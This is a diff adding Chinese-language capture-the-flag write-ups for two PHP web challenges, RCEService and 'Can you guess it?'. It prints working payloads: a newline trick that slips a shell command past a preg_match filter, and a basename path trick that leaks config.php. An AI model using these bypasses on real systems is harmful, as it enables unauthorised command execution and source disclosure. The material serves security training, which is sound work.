@@ -4487,9 +4487,73 @@ if(isset($_POST['username']) and $_POST['username'] != '' )
 
 ## [FBCTF2019]RCEService
 
+### 1. 前置知识
+
+**json_decode**
+
+(PHP 5 >= 5.2.0, PHP 7, PECL json >= 1.2.0)
+
+json_decode — 对 JSON 格式的字符串进行解码
+
+**说明**
+
+json_decode ( string `$json` [, bool `$assoc` = **`FALSE`** [, int `$depth` = 512 [, int `$options` = 0 ]]] ) : [mixed](language.pseudo-types.html#language.types.mixed)
+
+接受一个 JSON 编码的字符串并且把它转换为 PHP 变量
+
+**参数**
+
+- `json`
+
+  待解码的 `json` [string](language.types.string.html) 格式的字符串。这个函数仅能处理 UTF-8 编码的数据。**Note**:PHP implements a superset of JSON as specified in the original [» RFC 7159](http://www.faqs.org/rfcs/rfc7159).
+
+- `assoc`
+
+  当该参数为 **`TRUE`** 时，将返回 [array](language.types.array.html) 而非 [object](language.types.object.html) 。
+
+- `depth`
+
+  指定递归深度。
+
+- `options`
+
+  由 **`JSON_BIGINT_AS_STRING`**, **`JSON_INVALID_UTF8_IGNORE`**, **`JSON_INVALID_UTF8_SUBSTITUTE`**, **`JSON_OBJECT_AS_ARRAY`**, **`JSON_THROW_ON_ERROR`** 组成的掩码。 这些常量的行为在[JSON constants](json.constants.html)页面有进一步描述。
+
+源码中有这么一条代码：` $cmd = json_decode($json, true)['cmd'];`这里解释以下
+
+对于`json_decode`，如果第二个参数为`True`，那么就会返回**数组**，但是如果传入的JSON对象是一个字符串，那么解码出来还是字符串；如下
+
+```php
+<?php
+$src = '"dir"';
+$cmd = json_decode($src, true);
+var_dump($cmd);						# 输出：string(3) "dir"
+```
+
+只有当传入的是一个数组的时候，才会放回一个数组。如下：
+
+```php
+<?php
+$src = '{"key":"value"}';
+$cmd = json_decode($src, true);
+var_dump($cmd);
+
+# 输出
+array(1) {
+  'key' =>
+  string(5) "value"
+}
+```
+
+那么代码就是要求传入一个数组，并且键名为`cmd`
+
+### 2. 复现
+
 这题就很搞，没有任何的提示，然后去看了以下wp，人家博主都是直接找源码来看的。这里直接贴上
 
-ke
+可以看到过滤非常的严格，基本上都过滤死了；那么这里只能绕过`preg_match`
+
+**`preg_match`：只校验第一行内容**，那么如果使用换行，那么就可以绕过过滤；payload：`cmd={%0A"cmd":+"echo $PATH"%0A}`
 
 ```php
 <?php
@@ -4518,9 +4582,106 @@ if (isset($_REQUEST['cmd'])) {
 ?>
 ```
 
+由于脚本中将环境变量写死为`PATH=/home/rceservice/jail`，即：当我们输入命令，如：`cat dir pwd`这些命令的时候，系统会自动去变量名为`PATH`所定义的路径下寻找可执行的二进制文件，`ls`看以下这个路径下，只有`ls`的二进制可执行文件
 
+![image-20231206221137491](CTF.assets/image-20231206221137491.png)
 
+那么如果要执行其他的命令，就必须指定具体的路径，所以最后的payload：
 
+```
+{%0A"cmd":+"/bin/cat /home/rceservice/flag"%0A}
+```
+
+## [Zer0pts2020]Can you guess it?
+
+### 1. 前置知识
+
+#### 1.1 basename 定义 及利用点
+
+##### 定义
+
+```
+string basename ( string $path [, string $suffix ] )
+```
+
+给出一个包含有指向一个文件的全路径的字符串，本函数返回基本的文件名。
+如：
+
+```
+<?php
+$path = "/testweb/home.php/";
+
+//显示带有文件扩展名的文件名
+echo basename($path);
+
+//显示不带有文件扩展名的文件名
+echo basename($path,".php");
+?> 
+———————————————————————————
+home.php
+home
+```
+
+##### 利用点
+
+**我们需要注意的是他会忽略一些奇怪的字符**如： `%80 ~ %ff`
+
+### 2. CTF题解
+
+[【题目链接】](https://buuoj.cn/challenges#[Zer0pts2020]Can you guess it?)
+
+1. 打开题目，我们可以看到源码如下：
+
+   ```
+   <?php
+   include 'config.php'; // FLAG is defined in config.php
+   
+   if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+     exit("I don't know what you are thinking, but I won't let you read it :)");
+   }
+   
+   if (isset($_GET['source'])) {
+     highlight_file(basename($_SERVER['PHP_SELF']));
+     exit();
+   }
+   
+   $secret = bin2hex(random_bytes(64));
+   if (isset($_POST['guess'])) {
+     $guess = (string) $_POST['guess'];
+     if (hash_equals($secret, $guess)) {
+       $message = 'Congratulations! The flag is: ' . FLAG;
+     } else {
+       $message = 'Wrong.';
+     }
+   }
+   ?>
+   ```
+
+2. 虽然下面猜对了也可以出flag，但似乎没有漏洞点。其实利用点在:
+
+   ```
+   if (isset($_GET['source'])) {
+     highlight_file(basename($_SERVER['PHP_SELF']));
+     exit();
+   }
+   ```
+
+   但是前面还有过滤：
+
+   ```
+   if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
+     exit("I don't know what you are thinking, but I won't let you read it :)");
+   }
+   ```
+
+3. 其中`$_SERVER['PHP_SELF']`我们知道它的值是url相对路径。也就是说我们输入`/index.php/config.php?source` 会返回`/index.php/config.php`
+
+4. 我们知道`preg_match` 是需要完全匹配才会返回true的，也就是说我们输入`/index.php/config.php/a`就可以绕过，但是basename的结果会是`a`显然会报错，因为没这个文件。此时我们想到了basename会忽略一些奇怪的字符`%80 ~ %ff`。
+
+5. 所以我们输入`/index.php/comfig.php/%ff` 就可以进行显示comfig.php文件，这里所有的操作都是在index.php下进行的（我们看到的代码都是index.php的代码）。当然我们不要忘记传get的变量source。
+
+6. payload：`/index.php/config.php/%81?source`
+   [![img](CTF.assets/5eb89ffbc2a9a83be53b48cb.jpg)](https://pic.downk.cc/item/5eb89ffbc2a9a83be53b48cb.jpg)
 
 # Misc
 
